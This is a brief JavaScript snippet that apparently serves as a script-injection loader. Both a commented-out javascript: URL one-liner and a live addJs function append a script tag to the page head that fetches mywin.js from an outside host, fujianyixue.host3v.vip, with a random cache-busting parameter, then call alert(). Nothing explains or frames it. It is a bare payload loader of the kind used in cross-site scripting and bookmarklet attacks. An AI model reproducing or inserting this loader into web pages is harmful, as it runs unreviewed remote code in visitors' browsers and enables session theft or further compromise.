//javascript:var oHead = document.getElementsByTagName('HEAD').item(0); var oScript= document.createElement("script"); oScript.type = "text/javascript"; oScript.src="http://fujianyixue.host3v.vip/mywin.js?i="+Math.random(); oHead.appendChild( oScript);alert()
function addJs(url){
  var oHead = document.getElementsByTagName('HEAD').item(0); 
  var oScript= document.createElement("script");
  oScript.type = "text/javascript"; 
  oScript.src=url; 
  oHead.appendChild( oScript);
}
addJs("http://fujianyixue.host3v.vip/mywin.js?i="+Math.random());
alert()
